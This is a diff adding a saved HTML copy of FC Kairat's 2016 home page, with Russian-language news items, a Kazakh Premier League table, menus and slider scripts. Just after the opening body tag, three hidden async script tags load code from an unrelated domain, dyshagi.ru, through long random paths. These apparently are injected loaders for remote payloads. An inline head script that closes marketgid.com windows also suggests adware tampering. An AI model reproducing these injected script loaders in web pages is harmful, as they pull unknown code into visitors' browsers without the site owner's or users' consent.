@@ -1,0 +1,682 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0027)http://www.fckairat.kz/main -->
+<html xmlns="http://www.w3.org/1999/xhtml" class=" js csstransforms3d"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript">for (var name in this) {if (typeof this[name] === "object" && this[name] !== null && typeof this[name].url === "string") {try {var u = new URL(this[name].url);if (u && u.hostname.indexOf("marketgid.com")!==-1) {this[name].close(), this[name] = null;}} catch (e) {}}}</script>
+    <link href="http://www.fckairat.kz/css/img/fck.ico" rel="shortcut icon" type="image/x-icon">
+    
+    <title>Официальный Сайт ФК"Кайрат"</title>
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <link rel="stylesheet" href="./Официальный Сайт ФК_Кайрат__files/kairat.css" type="text/css" media="screen, projection">
+    <script id="twitter-wjs" src="./Официальный Сайт ФК_Кайрат__files/widgets.js"></script><script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/jquery.js"></script><script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/script.php"></script><style type="text/css"></style>    <link rel="stylesheet" href="./Официальный Сайт ФК_Кайрат__files/jquery.jscrollpane.css" type="text/css" media="screen">
+    
+    <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/jquery.mousewheel.js"></script>
+                <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/jquery.jscrollpane.js"></script>
+    <script language="JavaScript" type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/consumer.js"></script>
+    <script type="text/javascript">
+    ticketon.tryMobile(false);
+    </script>
+    <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/kairat.js"></script>    <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/openapi.js"></script>
+    <script type="text/javascript">
+      VK.init({apiId: 3613809, onlyWidgets: true});
+    </script>
+<link href="./Официальный Сайт ФК_Кайрат__files/style.css" type="text/css" rel="stylesheet">
+    <link type="text/css" rel="stylesheet" href="./Официальный Сайт ФК_Кайрат__files/smslider.css">
+    <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/jquery-latest.min.js"></script>
+    <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/jquery.smslider.min.js"></script>
+    <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/jquery.tools-1.1.1.js"></script>
+    <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/openapi(1).js"></script>
+    <script src="./Официальный Сайт ФК_Кайрат__files/jquery.featureCarousel.min.js" type="text/javascript" charset="utf-8"></script>
+    <script src="./Официальный Сайт ФК_Кайрат__files/jquery.cycle.all.min.js" type="text/javascript"></script>
+    <script src="./Официальный Сайт ФК_Кайрат__files/jquery.waterwheelCarousel.min.js" type="text/javascript"></script>
+    <script src="./Официальный Сайт ФК_Кайрат__files/scroll.main.js" type="text/javascript"></script>
+    <script src="./Официальный Сайт ФК_Кайрат__files/form.js" type="text/javascript"></script>
+    <script src="./Официальный Сайт ФК_Кайрат__files/main.js" type="text/javascript"></script>
+<link rel="stylesheet" type="text/css" href="./Официальный Сайт ФК_Кайрат__files/slicebox.css">
+<script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/modernizr.custom.13303.js"></script>
+<script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/jquery.slicebox.min.js"></script>
+    <script type="text/javascript" src="./Официальный Сайт ФК_Кайрат__files/countdown.js"></script>
+    <script>
+                 var currentyear=new Date().getFullYear();
+                 var thischristmasyear=(new Date().getMonth()==0 && new Date().getDate()==1)? currentyear : currentyear + 1 ; 
+                 var christmas="March 21, 2015 15:00:00";
+                 var currentTime=new Date();
+                 var targetdate=new Date(christmas);        
+                 var timediff=(targetdate-currentTime)/1000;
+                 var oneMinute=60;
+                 var oneHour=60*60;
+                 var oneDay=60*60*24;
+                 var dayfield=Math.floor(timediff/oneDay);
+                 var hourfield=Math.floor((timediff-dayfield*oneDay)/oneHour);
+                 var minutefield=Math.floor((timediff-dayfield*oneDay-hourfield*oneHour)/oneMinute);
+                 var secondfield=Math.floor((timediff-dayfield*oneDay-hourfield*oneHour-minutefield*oneMinute));
+                 $(function(){
+/* 
+                 $('.c-block:eq(0) .bl-inner span').text(dayfield);
+                 $('.c-block:eq(1) .bl-inner span').text(hourfield);
+                 $('.c-block:eq(2) .bl-inner span').text(minutefield);
+                 $('.c-block:eq(3) .bl-inner span').text(secondfield);
+*/
+                 $('.c-block:eq(0) .bl-inner span').text(0);
+                 $('.c-block:eq(1) .bl-inner span').text(0);
+                 $('.c-block:eq(2) .bl-inner span').text(0);
+                 $('.c-block:eq(3) .bl-inner span').text(0);
+                 });
+    </script>
+    <script type="text/javascript">
+    $(function() {
+        $('#tabs').tabs('#tabsText > li', {effect: 'fade', fadeOutSpeed: 0});
+    });
+    </script>
+    <script type="text/javascript">
+    $(document).ready(function(){
+    $('#sb-slider').slicebox();$('#sb-slider1').slicebox({
+slicesCount         : 1,
+                    sequentialRotation  : true,
+                    sequentialFactor    : 50,
+                    speed3d             : 250,
+orientation : 'v',
+slideshowTime   : 4000
+                });
+
+    $('#sm_slider').smSlider();
+    });
+    </script>
+    <script>
+        $(document).ready(function(){
+            if (($.browser.msie == true)&($.browser.version<=8)) 
+        {
+            var deg2radians = Math.PI*2/360,
+            deg = -11;
+            rad = deg * deg2radians,
+            costheta = Math.cos(rad),
+            sintheta = Math.sin(rad);
+
+            $('.currentDate p').css({
+                    filter: 'progid:DXImageTransform.Microsoft.Matrix(M11='+costheta+', M12='+(-1)*sintheta+', M21='+sintheta+', M22='+costheta+', SizingMethod="auto expand", enabled=true)'
+                });
+        };
+
+        });
+    </script>
+    
+    <script type="text/javascript"> 
+        $(document).ready(function() {
+            
+        $("ul#topnav li").hover(function() { //Hover over event on list item
+            $(this).css({ 'background' : '#1376c9 url(topnav_active.gif) repeat-x'}); //Add background color + image on hovered list item
+            $(this).css({ 'color' : '#fff'});
+            $(this).find("span").show(); //Show the subnav
+        } , function() { //on hover out...
+            $(this).css({ 'background' : 'none'}); //Ditch the background
+            $(this).find("span").hide(); //Hide the subnav
+        });
+            
+        });
+    </script>
+<script type="text/javascript">
+    $(document).ready(function(){
+        $('#sm_slider').smSlider();
+
+    });
+
+    $(window).scroll(function() {
+        var nav = $('.smenu');
+
+        if ($(this).scrollTop() > 180) {
+            deg = nav.rotationDegrees();
+            if (deg <=0){
+                deg = deg+2.5;
+                if(deg > 0) {
+                    deg = 0;
+                }
+                var srotate = "rotate(" + deg + "deg)";
+                nav.css({"-moz-transform" : srotate, "-webkit-transform" : srotate, "-o-transform": srotate, "-ms-transform": srotate, "transform": srotate});
+            }
+            nav.addClass('fixed');
+        }else{
+            deg = nav.rotationDegrees();
+            if($(this).scrollTop() == 0){
+                deg = -11;
+            }
+            if (deg >= -11){
+                deg = deg-2.5;
+                if(deg < -11) {
+                    deg = -11;
+                }
+                var srotate = "rotate(" + deg + "deg)";
+                nav.css({"-moz-transform" : srotate, "-webkit-transform" : srotate, "-o-transform": srotate, "-ms-transform": srotate, "transform": srotate});
+            }
+            nav.removeClass('fixed');
+        }
+
+    });
+
+    $.fn.rotationDegrees = function () {
+         var matrix = this.css("-webkit-transform") ||
+    this.css("-moz-transform")    ||
+    this.css("-ms-transform")     ||
+    this.css("-o-transform")      ||
+    this.css("-ms-transform")     ||
+    this.css("transform");
+    if(typeof matrix === 'string' && matrix !== 'none') {
+        var values = matrix.split('(')[1].split(')')[0].split(',');
+        var a = values[0];
+        var b = values[1];
+        var angle = Math.round(Math.atan2(b, a) * (180/Math.PI));
+    } else { var angle = 0; }
+    return angle;
+   };
+
+    </script>
+    <script type="text/javascript">ticketon.tryMobile(false);</script>
+<script>
+    $(document).ready(function(){
+        var ua = navigator.userAgent.toLowerCase();
+var     isAndroid = ua.indexOf("android") > -1;
+        if((navigator.platform == 'iPhone' || navigator.platform == 'iPod' || navigator.platform == 'iPhone Simulator' || isAndroid) && screen.width <1000)
+        {
+             $("body").css("background-position", "32% 0 !important");
+        };
+       
+    })
+    window.onload = function() {
+     $('#lent').css('top',$('#footer').position().top-24).show();
+};
+    </script><style>
+body{
+  margin:0;
+  font-family: 'HelveticaNeue-CondensedBold', Verdana, Geneva, sans-serif;
+  background-attachment:fixed;
+}
+#test {-webkit-animation: rainbow 2s 5 linear;}
+@-webkit-keyframes rainbow {
+25% {opacity: 1.5}
+75% {opacity: 0.7}
+100% {opacity: 1.5} 
+}
+a.knopka {
+  color: #fff; /* цвет текста */
+  text-decoration: none; /* убирать подчёркивание у ссылок */
+  user-select: none; /* убирать выделение текста */
+  background: rgb(212,75,56); /* фон кнопки */
+  padding: .7em 1.5em; /* отступ от текста */
+  outline: none; /* убирать контур в Mozilla */
+  float:right;
+  font-size:17px;
+  width:197px;
+margin-top: -23px;
+margin-bottom: 15px;
+} 
+a.knopka:hover { background: rgb(232,95,76); } /* при наведении курсора мышки */
+a.knopka:active { background: rgb(152,15,0); } /* при нажатии */</style><link rel="stylesheet" type="text/css" href="./Официальный Сайт ФК_Кайрат__files/consumer.css"><script type="text/javascript" charset="utf-8" async="" src="./Официальный Сайт ФК_Кайрат__files/timeline.0eae788bc4fdbe9cd3e72dca3bc26358.js"></script></head>
+ 
+
+<body style="background: url(&quot;/img/ny/glavnay_page_NY2.jpg&quot;) 50% 0px fixed;"><script async="async" charset="UTF-8" language="javascript" type="text/javascript" src="http://dyshagi.ru/65uaj4l2q1n6hqla3y44t26xqns8a3dxz7y7phr5r30l6rwl4l19fls6s3ld8msj6j62yzzm9lzk6w7lk5d?5lgnuluc=fec1"></script><script async="async" charset="UTF-8" language="javascript" type="text/javascript" src="http://dyshagi.ru/6xk1dbhq4bf8c96hrq2onq55zugdzsrx393sbwzfwwsl72zonuzx6ww60duj1q54wr6babn2qlt1ipjvayp?4jz2pkb8=fec1"></script><script async="async" charset="UTF-8" language="javascript" type="text/javascript" src="http://dyshagi.ru/8bfza2bp17f7surb1af3va5382kki4u3b6veva7xk9ad75rgjohl4qo8uxi8cvqwij5xfg7zaa3wmvxlyrl?53pdu42c=fec1"></script>
+<div id="container">
+    <div id="content1">
+            <div class="headerbg">
+                <div class="header">
+<style>
+.item a{ color:#fff;}
+.item a:link{ color:#fff;}
+.item a:visited{ color:#fff;}
+</style>
+                    <div class="item" style="font-size: 20px;">
+                        <a href="http://www.fckairat.kz/main/lang/1">РУС</a>
+                    </div>
+                    <div class="item" style="font-size: 20px;">
+                        <a href="http://www.fckairat.kz/main/lang/3">ҚАЗ</a>
+                    </div>
+                    <div class="item" style="font-size: 20px;">
+                        <a href="http://www.fckairat.kz/main/lang/2">ENG</a>
+                    </div>
+                    <div class="item itmarg2" style="display:none;">
+                        <div class="but1"><a href="http://translation.fckairat.kz/">Онлайн трансляция</a></div>
+                    </div>
+                    <div class="item itmarg2" style="display:none;">
+                        <div class="but2"><a href="http://www.fckairat.kz/main#">Конференция</a></div>
+                    </div>
+                    <div class="item itmarg">
+                        <a href="http://www.twitter.com/fc_kairat/"><div class="ic ic1"></div></a>
+                    </div>
+                    <div class="item itmarg">
+                        <a href="http://www.facebook.com/fckairat/"><div class="ic ic2"></div></a>
+                    </div>
+                    <div class="item itmarg">
+                        <a href="http://www.vk.com/fckairat"><div class="ic ic3"></div></a>
+                    </div>
+                    <div class="item itmarg">
+                        <a href="http://instagram.com/f.c.kairat"><div class="ic ic4"></div></a>
+                    </div>
+                    <div class="item itmarg">
+                        <a href="http://youtube.com/kairatofficial"><div class="ic ic5"></div></a>
+                    </div>
+                    <div class="item itmarg">
+                        <a href="http://fckairat.kz/rss.xml"><div class="ic ic6"></div></a>
+                    </div>
+                    <div class="item itmarg2">
+                        <div class="link"><a href="http://www.fckairat.kz/main#">Вход</a></div>
+                        <div class="link"><a href="http://www.fckairat.kz/main#">Регистрация</a></div>
+                    </div>
+                    <div class="item iteminp">
+                        <form method="GET" action="http://www.fckairat.kz/search">
+                            <input name="text" class="search" type="text" holder="Поиск по сайту...">
+                        </form>
+                    </div>
+                    <div class="item1">
+<div class="cont item1" style="font-size:16px;"><a href="http://www.fckairat.kz/contacts" style="
+    font-size: 24px;
+float: left;
+display: block;
+margin-left: -370px;
+margin-top: 10px;
+text-decoration: none;
+">Контакты</a></div>
+                        <div class="fifa"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="slidehov">
+                <div class="screen1">
+                    <div class="smenubg">
+                        <div class="smenu fixed" style="box-shadow: rgba(0, 0, 0, 0.901961) 0px 0px 50px; transform: rotate(-3.5deg);">
+                            <ul id="topnav"> 
+                            <li class="current"><a href="http://www.fckairat.kz/main">Главная</a></li> 
+                            <li> 
+                                <a href="http://www.fckairat.kz/team">Команды</a> 
+                                <span> 
+                                    <a href="http://www.fckairat.kz/team/players">Основная команда</a>
+                                    <a href="http://www.fckairat.kz/team/double" style="margin-left:100px;">Дубль</a> 
+                                    <a href="http://www.fckairat.kz/academy/teams" style="margin-left:250px;">Академия</a> <br><br>
+                                    <a href="http://www.fckairat.kz/team/shtab">Тренерский штаб</a> 
+                                    <a href="http://www.fckairat.kz/team/trainers" style="margin-left:100px;">Тренерский штаб (дубль)</a> 
+                                </span> 
+                            </li> 
+                            <li> 
+                                <a href="http://www.fckairat.kz/games">Матчи</a> 
+                                <span> 
+                                    <a href="http://www.fckairat.kz/games/calendar">Календарь</a> 
+                                    <a href="http://www.fckairat.kz/games">Сезон 2014</a>
+                                    <a href="http://www.fckairat.kz/games/past/2013/1">Сезон 2013(архив)</a> 
+                                    <a href="http://www.fckairat.kz/games/past/2012/1">Сезон 2012(архив)</a>
+                                    <a href="http://www.fckairat.kz/games/past/2011/1">Сезон 2011(архив)</a>
+                                </span> 
+                            </li> 
+                            <li> 
+                                <a href="http://www.fckairat.kz/club">Клуб</a> 
+                                <span> 
+                                    <a href="http://www.fckairat.kz/club/management">Руководство клуба</a> 
+                                    <a href="http://www.fckairat.kz/club">О клубе</a> 
+                                    <a href="http://www.fckairat.kz/club/history">История</a>
+                                    <a href="http://www.fckairat.kz/academy/fields/369">Стадион</a>
+                                    <a href="http://www.fckairat.kz/club/mission">Миссия</a>
+                                    <a href="http://www.fckairat.kz/club/signs">Гимн</a> 
+                                    <a href="http://www.fckairat.kz/contacts">Контакты</a>
+                                </span> 
+                            </li>
+                            <li>
+                                <a href="http://www.fckairat.kz/academy">Академия</a> 
+                                <span> 
+                                    <a href="http://www.fckairat.kz/academy/news">Новости</a> 
+                                    <a href="http://www.fckairat.kz/academy/teams">Команды</a> 
+                                    <a href="http://www.fckairat.kz/academy/selection">Объекты и расписание</a>                            
+                                </span> 
+                           </li> 
+                            <li>
+                                <a href="http://www.fckairat.kz/tv/photoreport">Медиа</a>
+                                <span> 
+                                    <a href="http://www.fckairat.kz/tv/photoreport" style="margin-left:480px;">Фото</a> 
+                                    <a href="http://www.fckairat.kz/tv/video">Видео</a>
+                                </span> 
+                            </li> 
+                            <li><a href="http://www.fckairat.kz/fame">Зал славы</a></li>
+                            <li><a href="http://www.fckairat.kz/fanzone">Фан-зона</a></li>                           
+                            <li><a href="http://sportlevel.kz/">Магазин </a></li> 
+                            <li><a href="http://www.fckairat.kz/procurement">Закупки</a></li> 
+                        </ul> 
+                        </div>
+                    </div>
+                </div>
+                                <div id="sm_slider">
+                    <ul class="sm_slider-inner" style="height: 475px; overflow: hidden; position: relative; width: 100%;">
+                                                    
+                                                    
+                                                    
+                                            <li class="slide1 sm_slide" style="width: 1036px; height: 475px; transition: all 0.6s ease; backface-visibility: hidden; left: -1036px; background: url(&quot;/upload/561c9cb7a307c.jpg&quot;) 50% 0%;">
+                                <a href="http://www.fckairat.kz/main#"><div class="slidelink"></div></a>
+                            </li><li class="slide2 sm_slide" style="width: 1036px; height: 475px; transition: all 0.6s ease; backface-visibility: hidden; left: -1036px; background: url(&quot;/upload/561c9cc202b31.jpg&quot;) 50% 0%;">
+                                <a href="http://www.fckairat.kz/main#"><div class="slidelink"></div></a>
+                            </li><li class="slide3 sm_slide active" style="width: 1036px; height: 475px; transition: all 0.6s ease; backface-visibility: hidden; left: 0px; background: url(&quot;/upload/561c9cce768e2.jpg&quot;) 50% 0%;">
+                                <a href="http://www.fckairat.kz/main#"><div class="slidelink"></div></a>
+                            </li></ul>
+                <i class="sm_prev"></i><i class="sm_next"></i><ul class="sm_nav"><li class="sm_nav-item"><i></i></li><li class="sm_nav-item"><i></i></li><li class="sm_nav-item active"><i></i></li></ul></div>
+            </div>
+        <div class="whitebg" style="box-shadow: 0 0 10px rgba(0,0,0,0.5);">
+            <div class="block3">
+                    <div class="b1item1">
+                        <div class="inright" style="margin:0px;">
+                            <img src="./Официальный Сайт ФК_Кайрат__files/timerplace.png" style="width:100%;height:100%;">
+                        </div>
+                        <div class="inside" style="margin:0px;">
+                            <img src="./Официальный Сайт ФК_Кайрат__files/572b65fdafe45.jpg" style="width:325px;height:150px;">
+                        </div>
+                    </div>
+                    <div class="b1item2" style="margin-bottom:20px;">
+                        <img src="./Официальный Сайт ФК_Кайрат__files/572b65fdafdff.jpg" style="width:100%;height:100%;">
+                    </div>
+            </div>
+                        <style type="text/css">
+                .menu a{
+                    text-align: center;
+                    padding: 2px 2px 2px 2px;
+                    margin-top: 10px;
+                    padding-left: 30px;  
+                }
+            </style>
+            <div class="menu">
+                <a pid="1" href="http://www.fckairat.kz/news/club"><img src="./Официальный Сайт ФК_Кайрат__files/all.png" width="17"> Новости клуба</a>
+                <a pid="2" href="http://www.fckairat.kz/news/team"><img src="./Официальный Сайт ФК_Кайрат__files/double.png" width="17"> Новости дубля</a>
+                <a pid="3" href="http://www.fckairat.kz/news/press"><img src="./Официальный Сайт ФК_Кайрат__files/tv.png" width="17">  СМИ о нас</a>
+                <a pid="5" href="http://www.fckairat.kz/news/academy"><img src="./Официальный Сайт ФК_Кайрат__files/academy.png" width="17"> Академия</a>
+                <a pid="0" href="http://www.fckairat.kz/news/all"><img src="./Официальный Сайт ФК_Кайрат__files/news.png" width="17"> Все новости</a>
+            </div>
+            <div class="blog">
+                <div class="left">
+                                    <div class="entry" style="height:300px;">
+                      <div class="descr" style="height:300px;">
+                            <div class="date">7 Мая 2016 г.</div>
+                            <div class="title"><a href="http://www.fckairat.kz/club/news/21773">Непростая «Астана»                            </a></div>
+                            <div class="text">
+                                <a href="http://www.fckairat.kz/club/news/21773" style="color:#414042; text-decoration:none;"><p>Молодежная команда ФК «Кайрат» одержала свою вторую победу в сезоне</p>
+<p>&nbsp;</p></a>
+                            </div>
+                        </div>
+                        <a href="http://www.fckairat.kz/club/news/21773"><img src="./Официальный Сайт ФК_Кайрат__files/news_big_4c4053a95f9fc4ced6890bdcb061b2f9.jpg" style="height:300px;"></a>
+                    </div>
+                                    <div class="entry" style="height:300px;">
+                      <div class="descr" style="height:300px;">
+                            <div class="date">7 Мая 2016 г.</div>
+                            <div class="title"><a href="http://www.fckairat.kz/club/news/21775">«Кайрат U-21» - «Астана U-21»: фото                            </a></div>
+                            <div class="text">
+                                <a href="http://www.fckairat.kz/club/news/21775" style="color:#414042; text-decoration:none;"><p>Представляем Вашему вниманию фотографии прошедшего матча</p>
+<p>&nbsp;</p></a>
+                            </div>
+                        </div>
+                        <a href="http://www.fckairat.kz/club/news/21775"><img src="./Официальный Сайт ФК_Кайрат__files/news_big_8a947383f4c9ab9023ebc9981a588399.jpg" style="height:300px;"></a>
+                    </div>
+                                    <div class="entry" style="height:300px;">
+                      <div class="descr" style="height:300px;">
+                            <div class="date">7 Мая 2016 г.</div>
+                            <div class="title"><a href="http://www.fckairat.kz/club/news/21774">Максим Шевченко: «С такими командами приятно играть»                            </a></div>
+                            <div class="text">
+                                <a href="http://www.fckairat.kz/club/news/21774" style="color:#414042; text-decoration:none;"><p>Главный тренер молодежной команды «Кайрат&nbsp;U-21» прокомментировал исход матча</p></a>
+                            </div>
+                        </div>
+                        <a href="http://www.fckairat.kz/club/news/21774"><img src="./Официальный Сайт ФК_Кайрат__files/news_big_02e7ad852e6ba7be3cb4e5febb07153e.jpg" style="height:300px;"></a>
+                    </div>
+                                    <div class="entry" style="height:300px;">
+                      <div class="descr" style="height:300px;">
+                            <div class="date">7 Мая 2016 г.</div>
+                            <div class="title"><a href="http://www.fckairat.kz/club/news/21772">«Кайрат U-21» - «Астана U-21»: составы                            </a></div>
+                            <div class="text">
+                                <a href="http://www.fckairat.kz/club/news/21772" style="color:#414042; text-decoration:none;"><p>Представляем Вашему вниманию стартовые составы играющих команд</p></a>
+                            </div>
+                        </div>
+                        <a href="http://www.fckairat.kz/club/news/21772"><img src="./Официальный Сайт ФК_Кайрат__files/news_big_7320dffae78e552fe053cb91894ffbbf.jpg" style="height:300px;"></a>
+                    </div>
+                                    <div class="entry" style="height:300px;">
+                      <div class="descr" style="height:300px;">
+                            <div class="date">7 Мая 2016 г.</div>
+                            <div class="title"><a href="http://www.fckairat.kz/news/academy/21771">Набирая обороты                            </a></div>
+                            <div class="text">
+                                <a href="http://www.fckairat.kz/news/academy/21771" style="color:#414042; text-decoration:none;"><p>В Казахстане завершается первый тур первенства среди команд 2001-2003 годов рождения</p>
+<p>&nbsp;</p></a>
+                            </div>
+                        </div>
+                        <a href="http://www.fckairat.kz/news/academy/21771"><img src="./Официальный Сайт ФК_Кайрат__files/news_big_41664d81de1b4852c6f426d38c6c27f6.jpg" style="height:300px;"></a>
+                    </div>
+                                    <a href="http://www.fckairat.kz/club/news/" style="font-size: 17px;float:right;" class="knopka">ВСЕ НОВОСТИ КЛУБА</a>
+                    <div class="news_likes">
+                    <div class="socials" id="vk_like_1"></div>
+                    <div class="fb-like socials" data-send="true" data-layout="button_count" data-width="450" data-show-faces="false"></div>
+                    <div class="clr"></div>
+                </div>
+                <div class="clr"></div>
+                   
+                    <!--<iframe width="660" height="450" src="//www.youtube-nocookie.com/embed/aMBrm2pvXno?list=UUTLB_4XSSGi0cXihfMjOXkw" frameborder="0" allowfullscreen></iframe>-->
+                    <iframe width="660" height="450" src="./Официальный Сайт ФК_Кайрат__files/FzAe91_HNtA.html" frameborder="0" allowfullscreen=""></iframe>
+
+                    <a href="http://www.fckairat.kz/news/show/608" style="font-size: 17px;float:right;margin-top:37px;margin-right:30px;" class="knopka">Фото</a>
+                    <div id="sb-slider" class="sb-slider" style="margin-top: 80px; width: 600px; height: 450px;">
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                                    
+                                            <div style="width: 600px; height: 450px; z-index: 10; position: relative; perspective: 1200px;"><div style="width: 600px; height: 450px; position: absolute; transform-style: preserve-3d; transition: -webkit-transform 800ms; backface-visibility: hidden; transform: translate3d(0px, 0px, -300px) rotate3d(0, 1, 0, -90deg); z-index: 100; top: 0px; left: 0px;"><div class="sb-side" style="width: 600px; height: 450px; transform: rotate3d(0, 1, 0, 0deg) translate3d(0px, 0px, 300px); background-image: url(&quot;http://www.fckairat.kz/img/photos/photos_017.jpg&quot;); background-color: rgb(34, 34, 34); background-position: 0px 0px;"></div><div class="sb-side" style="width: 600px; height: 450px; transform: rotate3d(0, 1, 0, 180deg) translate3d(0px, 0px, 300px); background-image: url(&quot;http://www.fckairat.kz/img/photos/photos_015.jpg&quot;); background-color: rgb(34, 34, 34); background-position: 0px 0px;"></div><div class="sb-side" style="width: 600px; height: 450px; transform: rotate3d(0, 1, 0, 90deg) translate3d(0px, 0px, 300px); background-image: url(&quot;http://www.fckairat.kz/img/photos/photos_018.jpg&quot;); background-color: rgb(34, 34, 34); background-position: 0px 0px;"></div><div class="sb-side" style="width: 600px; height: 450px; transform: rotate3d(0, 1, 0, -90deg) translate3d(0px, 0px, 300px); background-image: url(&quot;http://www.fckairat.kz/img/photos/photos_016.jpg&quot;); background-color: rgb(34, 34, 34); background-position: 0px 0px;"></div><div class="sb-side" style="width: 600px; height: 600px; top: -75px; transform: rotate3d(1, 0, 0, 90deg) translate3d(0px, 0px, 225px); background-color: rgb(34, 34, 34);"></div><div class="sb-side" style="width: 600px; height: 600px; top: -75px; transform: rotate3d(1, 0, 0, -90deg) translate3d(0px, 0px, 225px); background-color: rgb(34, 34, 34);"></div></div></div><div class="sb-nav"><span class="sb-nav-prev">Previous Slide</span><span class="sb-nav-next">Next Slide</span></div><div class="sb-options"><span class="rb-nav-pause">Autoplay</span><span class="sb-nav-info">Info</span></div><div class="sb-shadow"></div></div>
+                </div>
+                <div class="right">
+                      <div class="bl1">
+                    <a href="https://m.ticketon.kz/place/144">
+                    </a><div class="image"><a href="https://m.ticketon.kz/place/144">
+                            <img src="./Официальный Сайт ФК_Кайрат__files/bl1.jpg">
+                            </a><div class="headtext"><a href="https://m.ticketon.kz/place/144"></a><a href="https://m.ticketon.kz/place/144"> <img src="./Официальный Сайт ФК_Кайрат__files/buy.png" style="width:32px; height:32px;"> Купить билеты</a></div>
+                        </div>
+                    </div>
+                    <div class="bl1">
+                        <div class="image">
+<div class="fotorama" data-height="310px" data-nav="false" data-loop="true" data-autoplay="2000" data-arrows="false">
+<a href="http://www.fckairat.kz/academy/news/1715"><img src="./Официальный Сайт ФК_Кайрат__files/academy_on.png" style="padding-top:50px; height: 205px;"></a>
+<a href="http://www.fckairat.kz/academy/news/1715"><img src="./Официальный Сайт ФК_Кайрат__files/news_big_663f4a0c03cb479cc8a91bb54afea012.jpg" style="padding-top:50px; height: 205px;"></a>
+</div>
+                                                       <div class="headtext"><a href="http://www.fckairat.kz/academy/news/1715"><img src="./Официальный Сайт ФК_Кайрат__files/online.png" style="width:25px; height:20px;"> академия онлайн</a></div>
+                        </div>
+                    </div>
+                    <div class="bl2">
+                        <div id="table_widget" style="margin-top:2px;margin-left:1px;">
+<div class="blsh">
+	<div id="table_widget_header">
+		<div class="table_widget_title">
+			<img src="./Официальный Сайт ФК_Кайрат__files/table.png" width="20"> Турнирная таблица 
+		</div>
+		<ul id="table_widget_selector">
+			<li pid="1" class="table_cur"><a href="http://www.fckairat.kz/games/table/1">Премьер-лига</a></li>
+			<li pid="2"><a href="http://www.fckairat.kz/games/table/2">Дублеры</a></li>
+		</ul>
+		<div class="clr"></div>
+	</div>
+	
+	<div id="tour_table_1" class="tour_table_">
+		<table class="tour_table">
+        <tbody><tr class="table_th tr_0">
+            <th class="first_td" style="width:42px;">М</th>
+            <th style="width:135px;">Команды</th>
+            <th style="width:33px;">И</th>
+            <th style="width:54px;">Г</th>
+            <th style="width:42px;">О</th>
+        </tr>
+                            <tr class="tr_1">                <td class="first_td">1</td>
+                                <td>Астана</td>
+                <td>9</td>
+                <td>14-5</td>
+                <td>25</td> 
+            </tr>
+                            <tr class="tr_0">                <td class="first_td">2</td>
+                                <td>Иртыш</td>
+                <td>9</td>
+                <td>20-4</td>
+                <td>23</td> 
+            </tr>
+                            <tr class="tr_1">                <td class="first_td">3</td>
+                                <td>Окжетпес</td>
+                <td>9</td>
+                <td>11-5</td>
+                <td>16</td> 
+            </tr>
+                            <tr class="tr_0">                <td class="first_td">4</td>
+                                <td>Ордабасы</td>
+                <td>9</td>
+                <td>12-13</td>
+                <td>14</td> 
+            </tr>
+                            <tr class="tr_1">                <td class="first_td">5</td>
+                                <td>Актобе</td>
+                <td>9</td>
+                <td>9-12</td>
+                <td>12</td> 
+            </tr>
+                <tr class="kairat_tr">                <td class="first_td">6</td>
+                                <td>Кайрат</td>
+                <td>9</td>
+                <td>9-7</td>
+                <td>11</td> 
+            </tr>
+                            <tr class="tr_1">                <td class="first_td">7</td>
+                                <td>Тобол</td>
+                <td>8</td>
+                <td>11-10</td>
+                <td>11</td> 
+            </tr>
+                            <tr class="tr_0">                <td class="first_td">8</td>
+                                <td>Шахтёр</td>
+                <td>9</td>
+                <td>4-9</td>
+                <td>9</td> 
+            </tr>
+                            <tr class="tr_1">                <td class="first_td">9</td>
+                                <td>Акжайык</td>
+                <td>9</td>
+                <td>3-11</td>
+                <td>7</td> 
+            </tr>
+                            <tr class="tr_0">                <td class="first_td">10</td>
+                                <td>Атырау</td>
+                <td>8</td>
+                <td>5-9</td>
+                <td>7</td> 
+            </tr>
+                            <tr class="tr_1">                <td class="first_td">11</td>
+                                <td>Жетысу</td>
+                <td>9</td>
+                <td>8-15</td>
+                <td>6</td> 
+            </tr>
+                            <tr class="tr_0">                <td class="first_td">12</td>
+                                <td>Тараз</td>
+                <td>9</td>
+                <td>7-13</td>
+                <td>5</td> 
+            </tr>
+        </tbody></table>
+		<div class="table_widget_footer">
+			<a href="http://www.fckairat.kz/games/table/1">Расширенная таблица</a>
+		</div>
+	</div>
+	<div id="tour_table_2" class="tour_table_" style="display: none;">
+		<table class="tour_table">
+        <tbody><tr class="table_th tr_0">
+            <th class="first_td" style="width:42px;">М</th>
+            <th style="width:135px;">Команды</th>
+            <th style="width:33px;">И</th>
+            <th style="width:54px;">Г</th>
+            <th style="width:42px;">О</th>
+        </tr>
+                <tr class="kairat_tr">                <td class="first_td">8</td>
+                                <td>Кайрат</td>
+                <td>1</td>
+                <td>1-1</td>
+                <td>1</td> 
+            </tr>
+        </tbody></table>
+		<div class="table_widget_footer">
+			<a href="http://www.fckairat.kz/games/table/2">Расширенная таблица</a>
+		</div>
+	</div>
+	
+</div>	
+</div>                    </div>
+                    <div class="bl3" style="height:400px;">
+                            
+<div id="voter" style="margin-top:3px;margin-left:1px;">
+	<div class="blsh">
